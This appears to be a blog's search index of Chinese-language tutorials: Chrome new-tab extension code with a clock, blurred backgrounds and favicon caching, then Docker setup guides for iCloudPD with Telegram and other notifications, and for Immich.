.25rem 0; } popup.js（在原有基础上追加实时时间） /* … 上方保持原样 … */ /* ---------- 实时时钟 ---------- */ function updateClock() { const now = new Date(); const hh = String(now.getHours()).padStart(2, \u0026#39;0\u0026#39;); const mm = String(now.getMinutes()).padStart(2, \u0026#39;0\u0026#39;); const ss = String(now.getSeconds()).padStart(2, \u0026#39;0\u0026#39;); $(\u0026#39;#clock\u0026#39;).textContent = `${hh}:${mm}:${ss}`; } updateClock(); setInterval(updateClock, 1000); /* ---------- 其余原有逻辑 … ---------- */ 其余文件（manifest.json / background.js / icons）与之前保持一致，无需改动。\n这样即可得到一个：\n完全水平垂直居中的 new-tab 页面\nQuick Links 横向排列、自动换行\n“ Hello, L !” 下方实时显示当前系统时间（每秒刷新）\n添加日期 function getDayOfWeek(date) { const days = [\u0026#39;星期日\u0026#39;, \u0026#39;星期一\u0026#39;, \u0026#39;星期二\u0026#39;, \u0026#39;星期三\u0026#39;, \u0026#39;星期四\u0026#39;, \u0026#39;星期五\u0026#39;, \u0026#39;星期六\u0026#39;]; const dayIndex = date.getDay(); return days[dayIndex]; } // 获取今天的星期 const today = new Date(); const todayDayOfWeek = getDayOfWeek(today); console.log(\u0026#34;今天是：\u0026#34; + todayDayOfWeek); // 获取特定日期的星期 const specificDate = new Date(\u0026#39;2024-07-25\u0026#39;); // 示例日期 const specificDayOfWeek = getDayOfWeek(specificDate); console.log(\u0026#34;2024年7月25日是：\u0026#34; + specificDayOfWeek); //ymd const year = today.getFullYear(); const month = String(today.getMonth() + 1).padStart(2, \u0026#39;0\u0026#39;); const day = String(today.getDate()).padStart(2, \u0026#39;0\u0026#39;); const formattedDate = `${year}${month}${day}`; 代码修改 function getDayOfWeek(date) { const days = [\u0026#39;星期日\u0026#39;, \u0026#39;星期一\u0026#39;, \u0026#39;星期二\u0026#39;, \u0026#39;星期三\u0026#39;, \u0026#39;星期四\u0026#39;, \u0026#39;星期五\u0026#39;, \u0026#39;星期六\u0026#39;]; const dayIndex = date.getDay(); return days[dayIndex]; } function updateClock() { const now = new Date(); const year = now.getFullYear(); const month = String(now.getMonth() + 1).padStart(2, \u0026#39;0\u0026#39;); const day = String(now.getDate()).padStart(2, \u0026#39;0\u0026#39;); const formattedDate = `${year}-${month}-${day}`; const hh = String(now.getHours()).padStart(2, \u0026#39;0\u0026#39;); const mm = String(now.getMinutes()).padStart(2, \u0026#39;0\u0026#39;); const ss = String(now.getSeconds()).padStart(2, \u0026#39;0\u0026#39;); const wk =getDayOfWeek(now); $(\u0026#39;#clock\u0026#39;).textContent = `${formattedDate} ${wk} ${hh}:${mm}:${ss}`; } 全屏背景 模糊 + 半透明 ✅ 方案 A：filter + 伪元素（兼容性最好）\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;背景模糊示例 A\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; /* 通用初始化 */ *{margin:0;padding:0;box-sizing:border-box;} html,body{height:100%;} /* 1. 背景层（通过伪元素实现） */ body::before{ content:\u0026#39;\u0026#39;; position:fixed; /* 全屏固定 */ top:0;left:0; width:100%;height:100%; background:url(https://picsum.photos/1920/1080) center/cover no-repeat; filter:blur(8px); /* 模糊程度 */ opacity:.65; /* 透明度 0~1 */ z-index:-2; } /* 2. 正文内容 */ main{ position:relative; z-index:1; padding:10vh 10vw; color:#fff; font-family:system-ui, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt;Hello, Blurred World!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;这里是正文，完全不受模糊影响。\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ✅ 方案 B：backdrop-filter（毛玻璃，代码更短）\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;背景模糊示例 B\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; html,body{height:100%;margin:0;} body{ background:url(https://picsum.photos/1920/1080) center/cover no-repeat; display:flex; align-items:center; justify-content:center; } /* 半透明模糊遮罩 */ .glass{ width:60vw; padding:3rem; border-radius:1rem; background:rgba(255,255,255,.2); /* 遮罩颜色+透明度 */ backdrop-filter:blur(10px); /* 关键属性 */ -webkit-backdrop-filter:blur(10px);/* Safari */ color:#fff; font-family:system-ui, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;glass\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;backdrop-filter 毛玻璃\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;仅在此区域内叠加模糊效果。\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 注意：backdrop-filter 在旧版浏览器需加前缀，且 IE 不支持 。\n✅ 方案 C：双层 div（直观易改）\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;背景模糊示例 C\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; *{margin:0;padding:0;} html,body{height:100%;} .bg, .blur{ position:fixed; top:0;left:0; width:100%;height:100%; } .bg{ background:url(https://picsum.photos/1920/1080) center/cover no-repeat; z-index:-2; } .blur{ background:rgba(255,255,255,.4); /* 叠加淡白色 */ filter:blur(6px); z-index:-1; } main{ position:relative; z-index:1; padding:10vh 10vw; color:#fff; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;bg\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;blur\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt;双层 div 实现\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;背景图模糊，内容清晰。\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; A 伪元素\t全屏背景最简洁，正文绝对清晰\t✅ IE11+， B backdrop-filter\t一行 backdrop-filter:blur() 即可毛玻璃\t， Safari/Edge/Chrome/Firefox 需较新版本， C 双层\t结构直观，易叠加颜色\t✅ IE11+。\nfav cors 添加图标\n在 manifest.json 中添加了必要的权限： \u0026ldquo;favicon\u0026rdquo; 权限用于获取网站图标 更新了 CSP 策略，允许加载 data: 协议的图片\n{ \u0026#34;manifest_version\u0026#34;: 3, \u0026#34;name\u0026#34;: \u0026#34;L-ToDo\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Minimal new-tab with quick links \u0026amp; to-do list\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.1\u0026#34;, \u0026#34;chrome_url_overrides\u0026#34;: { \u0026#34;newtab\u0026#34;: \u0026#34;index.html\u0026#34; }, \u0026#34;permissions\u0026#34;: [\u0026#34;storage\u0026#34;, \u0026#34;activeTab\u0026#34;, \u0026#34;favicon\u0026#34;], \u0026#34;background\u0026#34;: { \u0026#34;service_worker\u0026#34;: \u0026#34;background.js\u0026#34; }, \u0026#34;content_security_policy\u0026#34;: { \u0026#34;extension_pages\u0026#34;: \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;self\u0026#39;; img-src \u0026#39;self\u0026#39; data: chrome-extension-resource:\u0026#34; } } 在 popup.js 中添加了新功能： fetchAndSaveFavicon 函数：获取并保存网站图标 convertBlobToDataURL 函数：将图标转换为 DataURL 格式永久保存 saveFavicon 和 loadFavicons 函数：管理图标缓存\n/* global chrome */ const $ = (sel, ctx = document) =\u0026gt; ctx.querySelector(sel); /* ---------- 存储工具 ---------- */ const STORAGE_KEY = \u0026#39;L-ToDo\u0026#39;; async function save(data) { return chrome.storage.local.set({ [STORAGE_KEY]: data }); } async function load() { const res = await chrome.storage.local.get(STORAGE_KEY); return res[STORAGE_KEY] || { links: [], todos: [] }; } /* ---------- 初始化 ---------- */ (async () =\u0026gt; { const data = await load(); renderLinks(data.links); renderTodos(data.todos); greet(); })(); /* ---------- 问候 ---------- */ function greet() { const name = localStorage.getItem(\u0026#39;username\u0026#39;) || \u0026#39;L\u0026#39;; //friend L $(\u0026#39;#greeting\u0026#39;).textContent = `Hello, ${name}!`; } /* ---------- Quick Links ---------- */ $(\u0026#39;#linkForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, async e =\u0026gt; { e.preventDefault(); const name = $(\u0026#39;#linkName\u0026#39;).value.trim(); const url = $(\u0026#39;#linkUrl\u0026#39;).value.trim(); const data = await load(); // 获取并保存网站图标 const iconUrl = await fetchAndSaveFavicon(url); data.links.push({ name, url, iconUrl }); await save(data); renderLinks(data.links); e.target.reset(); }); // 新函数：获取并保存网站图标 async function fetchAndSaveFavicon(url) { try { // 解析URL获取主机名 const parsedUrl = new URL(url); const hostname = parsedUrl.hostname; // 尝试从缓存中获取图标 const cachedIcons = await loadFavicons(); if (cachedIcons[hostname]) { return cachedIcons[hostname]; } // 构建可能的图标URL const possibleIconUrls = [ `${parsedUrl.origin}/favicon.ico`, `${parsedUrl.origin}/apple-touch-icon.png`, `${parsedUrl.origin}/apple-touch-icon-precomposed.png`, ]; // 尝试获取图标 for (const iconUrl of possibleIconUrls) { try { // 使用background脚本的CORS代理 const response = await fetch(`chrome-extension://${chrome.runtime.id}/_favicon/?pageUrl=${encodeURIComponent(url)}\u0026amp;size=32`); if (response.ok) { // 将图标转换为DataURL并保存 const blob = await response.blob(); const dataUrl = await convertBlobToDataURL(blob); // 更新缓存 await saveFavicon(hostname, dataUrl); return dataUrl; } } catch (error) { console.error(`Failed to fetch icon from ${iconUrl}:`, error); } } // 如果没有找到图标，使用默认图标 return \u0026#39;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzAwMDAwMCIgZD0iTTEyLDRDOS43OSw0IDgsNS43OSA4LDhDOCwxMC4yMSA5Ljc5LDEyIDEyLDEyQzE0LjIxLDEyIDE2LDEwLjIxIDE2LDhDMTYsNS43OSAxNC4yMSw0IDEyLDRNMTIsMTBDMTAuOTMsMTAgMTAsOS4wNyAxMCw4QzEwLDYuOTMgMTAuOTMsNiAxMiw2QzEzLjA3LDYgMTQsNi45MyAxNCw4QzE0LDkuMDcgMTMuMDcsMTAgMTIsMTBNMTcsMTRIMTdWMThDMTcsMTkuMTEgMTYuMTEsMjAgMTUsMjBIMVY0QzEsMi45IDEuOSwyIDMsMkgxNUMxNi4xMSwyIDE3LDIuOSAxNyw0VjE0TTMsNEgzVjE4SDE1VjRIM1oiLz48L3N2Zz4=\u0026#39;; } catch (error) { console.error(\u0026#39;Failed to fetch or save favicon:\u0026#39;, error); return \u0026#39;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzAwMDAwMCIgZD0iTTEyLDRDOS43OSw0IDgsNS43OSA4LDhDOCwxMC4yMSA5Ljc5LDEyIDEyLDEyQzE0LjIxLDEyIDE2LDEwLjIxIDE2LDhDMTYsNS43OSAxNC4yMSw0IDEyLDRNMTIsMTBDMTAuOTMsMTAgMTAsOS4wNyAxMCw4QzEwLDYuOTMgMTAuOTMsNiAxMiw2QzEzLjA3LDYgMTQsNi45MyAxNCw4QzE0LDkuMDcgMTMuMDcsMTAgMTIsMTBNMTcsMTRIMTdWMThDMTcsMTkuMTEgMTYuMTEsMjAgMTUsMjBIMVY0QzEsMi45IDEuOSwyIDMsMkgxNUMxNi4xMSwyIDE3LDIuOSAxNyw0VjE0TTMsNEgzVjE4SDE1VjRIM1oiLz48L3N2Zz4=\u0026#39;; } } // 新函数：将Blob转换为DataURL function convertBlobToDataURL(blob) { return new Promise((resolve, reject) =\u0026gt; { const reader = new FileReader(); reader.onloadend = () =\u0026gt; resolve(reader.result); reader.onerror = reject; reader.readAsDataURL(blob); }); } // 新函数：保存图标到存储 async function saveFavicon(hostname, iconUrl) { const favicons = await loadFavicons(); favicons[hostname] = iconUrl; await chrome.storage.local.set({ \u0026#39;L-ToDo-favicons\u0026#39;: favicons }); } // 新函数：从存储加载图标 async function loadFavicons() { const result = await chrome.storage.local.get(\u0026#39;L-ToDo-favicons\u0026#39;); return result[\u0026#39;L-ToDo-favicons\u0026#39;] || {}; } function renderLinks(list) { const ul = $(\u0026#39;#linkList\u0026#39;); ul.innerHTML = \u0026#39;\u0026#39;; list.forEach(({ name, url, iconUrl }, idx) =\u0026gt; { const li = document.createElement(\u0026#39;li\u0026#39;); li.innerHTML = ` \u0026lt;a href=\u0026#34;${url}\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;${iconUrl}\u0026#34; alt=\u0026#34;${name} icon\u0026#34; class=\u0026#34;favicon\u0026#34;\u0026gt; ${name} \u0026lt;/a\u0026gt; \u0026lt;button data-link-idx=\u0026#34;${idx}\u0026#34;\u0026gt;✕\u0026lt;/button\u0026gt;`; ul.appendChild(li); }); ul.addEventListener(\u0026#39;click\u0026#39;, async e =\u0026gt; { if (!e.target.matches(\u0026#39;[data-link-idx]\u0026#39;)) return; const idx = +e.target.dataset.linkIdx; const data = await load(); data.links.splice(idx, 1); await save(data); renderLinks(data.links); }); } /* ---------- To-Do List ---------- */ $(\u0026#39;#todoForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, async e =\u0026gt; { e.preventDefault(); const text = $(\u0026#39;#todoInput\u0026#39;).value.trim(); const data = await load(); data.todos.push({ text, done: false }); await save(data); renderTodos(data.todos); e.target.reset(); }); function renderTodos(list) { const ul = $(\u0026#39;#todoList\u0026#39;); ul.innerHTML = \u0026#39;\u0026#39;; list.forEach(({ text, done }, idx) =\u0026gt; { const li = document.createElement(\u0026#39;li\u0026#39;); li.innerHTML = ` \u0026lt;label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; data-todo-idx=\u0026#34;${idx}\u0026#34; ${done ? \u0026#39;checked\u0026#39; : \u0026#39;\u0026#39;}\u0026gt; \u0026lt;span style=\u0026#34;${done ? \u0026#39;text-decoration:line-through\u0026#39; : \u0026#39;\u0026#39;}\u0026#34;\u0026gt;${text}\u0026lt;/span\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button data-todo-del=\u0026#34;${idx}\u0026#34;\u0026gt;✕\u0026lt;/button\u0026gt;`; ul.appendChild(li); }); ul.addEventListener(\u0026#39;click\u0026#39;, async e =\u0026gt; { const data = await load(); if (e.target.matches(\u0026#39;[data-todo-idx]\u0026#39;)) { const idx = +e.target.dataset.todoIdx; data.todos[idx].done = e.target.checked; await save(data); renderTodos(data.todos); } if (e.target.matches(\u0026#39;[data-todo-del]\u0026#39;)) { const idx = +e.target.dataset.todoDel; data.todos.splice(idx, 1); await save(data); renderTodos(data.todos); } }); } function getDayOfWeek(date) { const days = [\u0026#39;星期日\u0026#39;, \u0026#39;星期一\u0026#39;, \u0026#39;星期二\u0026#39;, \u0026#39;星期三\u0026#39;, \u0026#39;星期四\u0026#39;, \u0026#39;星期五\u0026#39;, \u0026#39;星期六\u0026#39;]; const dayIndex = date.getDay(); return days[dayIndex]; } function updateClock() { const now = new Date(); const year = now.getFullYear(); const month = String(now.getMonth() + 1).padStart(2, \u0026#39;0\u0026#39;); const day = String(now.getDate()).padStart(2, \u0026#39;0\u0026#39;); const formattedDate = `${year}-${month}-${day}`; const hh = String(now.getHours()).padStart(2, \u0026#39;0\u0026#39;); const mm = String(now.getMinutes()).padStart(2, \u0026#39;0\u0026#39;); const ss = String(now.getSeconds()).padStart(2, \u0026#39;0\u0026#39;); const wk = getDayOfWeek(now); $(\u0026#39;#clock\u0026#39;).textContent = `${formattedDate} ${wk} ${hh}:${mm}:${ss}`; } updateClock(); setInterval(updateClock, 1000); /* ---------- 导出 / 导入 ---------- */ $(\u0026#39;#exportBtn\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, async () =\u0026gt; { const blob = new Blob([JSON.stringify(await load(), null, 2)], { type: \u0026#39;application/json\u0026#39; }); const url = URL.createObjectURL(blob); const a = document.createElement(\u0026#39;a\u0026#39;); a.href = url; a.download = \u0026#39;L-ToDo-backup.json\u0026#39;; a.click(); URL.revokeObjectURL(url); }); $(\u0026#39;#importBtn\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; $(\u0026#39;#importFile\u0026#39;).click()); $(\u0026#39;#importFile\u0026#39;).addEventListener(\u0026#39;change\u0026#39;, async e =\u0026gt; { const file = e.target.files[0]; if (!file) return; try { const data = JSON.parse(await file.text()); await save(data); location.reload(); } catch (err) { alert(\u0026#39;Invalid backup file\u0026#39;); } }); 增强了 Quick Links 功能： 现在添加链接时会自动获取并保存网站图标 图标会以 DataURL 格式永久保存在本地存储中 使用 Chrome 扩展的 favicon API 绕过 CORS 限制 添加了图标缓存机制，避免重复请求相同网站的图标\n","permalink":"https://qfsyso.github.io/posts/chrome-extensions/","summary":"Chrome Extensions目录结构。 📁 L-ToDo/\n├─ 📄 manifest.json\n├─ 📄 popup.html\n├─ 📄 popup.js\n├─ 📄 background.js\n├─ 📄 content.css\n├─ 📄 icons/\n│ ├─ 16.png\n│ ├─ 48.png\n│ └─ 128.png\n└─ 📁 _metadata (Chrome生成)\n一、manifest.json { \u0026#34;manifest_version\u0026#34;: 3, \u0026#34;name\u0026#34;: \u0026#34; L-ToDo\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Minimal new-tab with quick links \u0026amp; to-do list\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;icons\u0026#34;: { \u0026#34;16\u0026#34;: \u0026#34;icons/16.png\u0026#34;, \u0026#34;48\u0026#34;: \u0026#34;icons/48.png\u0026#34;, \u0026#34;128\u0026#34;: \u0026#34;icons/128.png\u0026#34; }, \u0026#34;chrome_url_overrides\u0026#34;: { \u0026#34;newtab\u0026#34;: \u0026#34;popup.html\u0026#34; }, \u0026#34;permissions\u0026#34;: [\u0026#34;storage\u0026#34;], \u0026#34;background\u0026#34;: { \u0026#34;service_worker\u0026#34;: \u0026#34;background.","title":"Chrome Extensions"},{"content":"iCloudPD iCloudPD官方镜像仓库地址：https://hub.docker.com/r/icloudpd/icloudpd\niCloudPD官方仓库地址：https://github.com/icloud-photos-downloader/icloud_photos_downloader/\n一、环境准备 1.1 目录结构 /root/\n├── config # 存放配置文件\n├── iCloud # 同步照片存储目录\n1.2 关键配置说明 TZ\t时区设置\tAsia/Shanghai\nauthentication_type\t认证类型\tMFA(国际)\t2FA(国内)\nicloud_china\t是否使用国内服务器\ttrue\nauth_china\t是否生成国内Cookie\ttrue\n二、Docker部署 2.1 国际 docker run -d \\ --name icloudpd \\ --restart always \\ -v /root/config:/config \\ -v /root/iCloud:/iCloud \\ -e TZ=Asia/Shanghai \\ -e apple_id=dxxr@outlook.com \\ -e authentication_type=\u0026#39;MFA\u0026#39; \\ -e icloud_china=true \\ -e auth_china=true \\ -e download_path=/iCloud \\ boredazfcuk/icloudpd 2.2 国内 docker run -d \\ --name x2_icloudpd \\ --restart always \\ -v /root/config:/config \\ -v /root/photos:/photos \\ -e TZ=Asia/Shanghai \\ -e apple_id=dxxr@outlook.com \\ -e authentication_domain=cn \\ -e icloud_china=true \\ -e download_path=/home/user/iCloud \\ boredazfcuk/icloudpd 三、初始化认证 3.1 进入容器 docker exec -it icloudpd /bin/sh 3.2 用户权限设置 # 创建与宿主机同UID/GID的用户 adduser -u 1000 -g 1000 user exit 3.3 首次认证流程 docker exec -it icloudpd sync-icloud.sh --Initialise 输入Apple ID密码 保存密码到钥匙串（推荐选Y） 输入短信验证码 输入两步验证代码 成功日志示例：\n2025-07-23 14:58:15 INFO Authentication completed successfully 2025-07-23 14:58:15 INFO Multi-factor authentication cookie generated\n四、Telegram通知配置 4.1 创建Telegram机器人 通过@BotFather创建新机器人\n/newbot\n输入机器人名称：myicloudpd1\n输入机器人用户名：myicloudpd1_bot\n搜索\nBotFather\n/start\n新建机器人 /newbot\n输入用户名 myicloudpd1\n用户名_bot myicloudpd1_bot\n获取Bot Token：\n输入http://api.telegram.org/bot[tk]/getUpdates\n如：https://api.telegram.org/bot7679820xxx:AAFxxxx/getUpdates\n聊天\n刷新 http://api.telegram.org/bot[tk]/getUpdates\n4.2 获取Chat ID 得到chatid\ncurl \u0026#34;https://api.telegram.org/bot\u0026lt;BotToken\u0026gt;/getUpdates\u0026#34; 响应示例：\n{\u0026#34;ok\u0026#34;:true,\u0026#34;result\u0026#34;:[{\u0026#34;update_id\u0026#34;:123456789,\u0026#34;message\u0026#34;:{\u0026#34;chat\u0026#34;:{\u0026#34;id\u0026#34;:1001234567890,\u0026#34;first_name\u0026#34;:\u0026#34;Qoo Iu\u0026#34;},\u0026#34;text\u0026#34;:\u0026#34;/start\u0026#34;}}]} 4.3 配置通知 修改容器内配置文件\ndocker exec -it icloudpd nano /config/icouldpd.conf or docker exec -it icloudpd /bin/sh \u0026gt; nano /config/icouldpd.conf 修改内容\nnotification_type=telegram\ntelegram_chat_id=791439xxx telegram_token=767982xxx:AAFQRwUvojIXNpu9sKSn0MGgDgrLYxxx\n4.4重启docker容器 查看tg即可看到消息 xx, [2025/7/23 15:12] /start\nxx, [2025/7/23 15:12] 123\nmyicloudpd1, [2025/7/23 15:19]\n▶ iCloudPD 启动成功，开始同步当前 Apple ID 中的照片\nmyicloudpd1, [2025/7/23 15:20] ⏬ iCloudPD iCloud 图库同步完成，新增 2 张照片 Most recent 2 下载 files: 2025/07/23/IMG_0031.HEIC 2025/07/23/IMG_0031_HEVC.MOV\n五、高级配置 增量同步策略\n每次同步最近500个新增文件 -e incremental_sync=500\n文件格式转换\nHEIC转JPEG -e convert_heic=true\n-e jpeg_quality=85\n定时同步\n每6小时同步一次 -e schedule=\u0026ldquo;0 */6 * * *\u0026rdquo;\n其他通知 bark bark_device_key=\u0026#34;xxxxxxxx\u0026#34; bark_server=\u0026#34;api.day.app\u0026#34; notification_type=bark 下载bark软件\ncurl https://api.day.app/xxxxxxxx/test {\u0026#34;code\u0026#34;:200,\u0026#34;message\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;timestamp\u0026#34;:1711085706}/ 中间的xxx = key\nhttps://api.day.app/xxxxxxxx/icloudpd/icloudpdokokokok\nBark自建服务端 https://day.app/2018/06/bark-server-document/\n企业微信配置 iCloudPD 其他环境变量设置此处省略，只列出通知环境变量。\nnotification_type 通知类型设置为 WeCom\nwecom_proxy 微信白名单域名设置，格式：https://abc.com\nwecom_id 企业微信通知，企业微信通知，企业ID\nwecom_secret 企业微信通知，企业应用的Secret\nagentid 企业微信通知，企业应用的id\ntouser 企业微信通知，接收通知的对象\ncontent_source_url 企业微信通知，阅读原文跳转链接\nname 企业微信通知，当前 Apple ID 所有人\nmedia_id_startup 企业微信通知，启动成功通知封面\nmedia_id_download 企业微信通知，下载通知封面\nmedia_id_delete 企业微信通知，删除文件通知封面\nmedia_id_expiration 企业微信通知，cookie即将过期通知封面\nmedia_id_warning 企业微信通知，同步失败、cookiey已过期通知封面\n邮件通知配置 msmtp_host：如果将 notification_type 设置为 ，则为必填项msmtp。 smtp 服务器的域名\nmsmtp_port：如果将 notification_type 设置为 ，则为必填项msmtp。SMTP 服务的端口。通常为 465 或 587\nmsmtp_tls：如果 notification_type 设置为 ，则为强制msmtp。设置为on或off可启用或禁用 TLS 加密。\nmsmtp_from：如果将 notification_type 设置为 ，则为必填项msmtp。发件人的电子邮件地址\nmsmtp_user：如果将 notification_type 设置为 ，则为必填项msmtp。 SMTP 提供商的登录用户名。\nmsmtp_pass：如果将 notification_type 设置为 ，则为必填项msmtp。登录用户的密码\nmsmtp_args：可选的额外参数，用于msmtp邮件提供商有特殊要求的情况。例如\u0026ndash;tls-starttls=off：\nNextcloud配置 nextcloud_delete：如果要从nextcloud中删除文件，请将此变量设置为true。此设置要求auto_delete也设置为true。当在“最近删除”中找到文件时，auto_delete函数将删除本地文件。如果nextcloud_delete也设置为true，那么它将从nextcloud服务器中删除该文件。\nnextcloud_password：这是您要同步到的nextcloud帐户的密码\nnextcloud_target_dir：这是您要放置文件的根文件夹的名称。请注意，此时无法将文件上传到nextcloud服务器的根文件夹。\nnextcloud_upload：将此设置为true以将文件上传到nextcloud服务器\nnextcloud_url：这是您的nextcloud服务器的url，例如。https://my.server.local/或https://my.server.local/nextcloud/\nnextcloud_username：这是您要上传文件的帐户的用户名。\nnetwork bridge CREATING A CONTAINER First off, create a dedicated network for your iCloudPD conter(s) as this overcomes some DNS and routing issues may occur if you use the legacy default network bridge that Docker creates. In this example, I\u0026rsquo;ve have told it to use the IP address subnet 192.168.115.1 - 192.168.115.254 and configured the gateway to be 192.168.115.254. You can use any subnet you like:\ndocker network create \\ --driver=bridge \\ --subnet=192.168.115.0/24 \\ --gateway=192.168.115.254 \\ --opt com.docker.network.bridge.name=icloudpd_br0 \\ icloudpd_bridge Then create the container, connecting it to the new icloudpd network bridge. It should look something like this:\ndocker create \\ --name iCloudPD_boredazfcuk \\ --hostname icloudpd_boredazfcuk \\ --network icloudpd_bridge \\ --restart=always \\ --env TZ=Europe/London \\ --volume icloudpd_boredazfcuk_config:/config \\ --volume /home/boredazfcuk/iCloud:/home/boredazfcuk/iCloud \\ boredazfcuk/icloudpd 配置参考\nhttps://github.com/boredazfcuk/docker-icloudpd/blob/master/CONFIGURATION.md\nnotification_days: When your cookie is nearing expiration, this is the number of days in advance it should notify you. You will receive a single notification, per day, in the days running up to cookie expiration. Default: 7.\nAfter this, the container should start downloading your photos.\nDockerfile has a health check which will change the status of the container to \u0026lsquo;unhealthy\u0026rsquo; if the cookie is due to expire within a set number of days (notification_days) and also if the download fails.\nMULTIFACTOR RE-AUTHENTICATION Every 30 days, the cookie will expire and need to be re-authenticated. This can be done by running the re-authentication script:\ndocker container exec -it reauth.sh It will then launch the re-authentication process, presenting you with an MFA code on your iDevice and asking for this new code on the command line. e.g:\nDEBUG Authenticating\u0026hellip; INFO Two-step/two-factor authentication is required (2fa)\n","permalink":"https://qfsyso.github.io/posts/icloud-download-tg-bot-sync/","summary":"iCloudPD iCloudPD官方镜像仓库地址：https://hub.docker.com/r/icloudpd/icloudpd\niCloudPD官方仓库地址：https://github.com/icloud-photos-downloader/icloud_photos_downloader/\n一、环境准备 1.1 目录结构 /root/\n├── config # 存放配置文件\n├── iCloud # 同步照片存储目录\n1.2 关键配置说明 TZ\t时区设置\tAsia/Shanghai\nauthentication_type\t认证类型\tMFA(国际)\t2FA(国内)\nicloud_china\t是否使用国内服务器\ttrue\nauth_china\t是否生成国内Cookie\ttrue\n二、Docker部署 2.1 国际 docker run -d \\ --name icloudpd \\ --restart always \\ -v /root/config:/config \\ -v /root/iCloud:/iCloud \\ -e TZ=Asia/Shanghai \\ -e apple_id=dxxr@outlook.com \\ -e authentication_type=\u0026#39;MFA\u0026#39; \\ -e icloud_china=true \\ -e auth_china=true \\ -e download_path=/iCloud \\ boredazfcuk/icloudpd 2.2 国内 docker run -d \\ --name x2_icloudpd \\ --restart always \\ -v /root/config:/config \\ -v /root/photos:/photos \\ -e TZ=Asia/Shanghai \\ -e apple_id=dxxr@outlook.","title":"ICloud Download TG Bot Sync"},{"content":"Immich Immich是一个自托管的照片和视频备份解决方案，允许用户在私有服务器上存储、管理和分享他们的媒体文件。这个项目旨在提供一个类似于Google照片或iCloud照片库的体验，但是用户可以完全控制自己的数据。通过自托管，用户不需要依赖第三方云服务提供商来存储私人照片和视频，这增加了隐私保护和数据所有权。\n以下是使用 Docker 安装 Immich 的步骤（基于官方推荐方法）： 安装 Docker 和 Docker Compose（若未安装） 。\n创建项目目录： mkdir ./immich-app \u0026amp;\u0026amp; cd ./immich-app 下载必要文件： docker-compose.yml：\nwget https://github.com/immich-app/immich/releases/latest/download/docker-compose.yml .env 文件（从 example.env 改名）：\nwget -O .env https://github.com/immich-app/immich/releases/latest/download/example.env 修改 .env 文件（可选，如设置 UPLOAD_LOCATION、DB_DATA_LOCATION、TZ 等） 。\n启动容器： docker compose up -d （若需升级，可运行 docker compose pull \u0026amp;\u0026amp; docker compose up -d） 。\n访问 Immich： 浏览器打开 http://IP地址:2283\n（默认端口，可在 docker-compose.yml 中修改） 。\n参考 https://immich.app/docs/install/docker-compose/ https://apps.apple.com/us/app/immich/id1613945652 https://github.com/immich-app/immich\nnextcloud 网盘 https://github.com/nextcloud/server https://github.com/nextcloud/android https://apps.apple.com/us/app/nextcloud/id1125420102\n","permalink":"https://qfsyso.github.io/posts/immich/","summary":"Immich Immich是一个自托管的照片和视频备份解决方案，允许用户在私有服务器上存储、管理和分享他们的媒体文件。这个项目旨在提供一个类似于Google照片或iCloud照片库的体验，但是用户可以完全控制自己的数据。通过自托管，用户不需要依赖第三方云服务提供商来存储私人照片和视频，这增加了隐私保护和数据所有权。\n以下是使用 Docker 安装 Immich 的步骤（基于官方推荐方法）： 安装 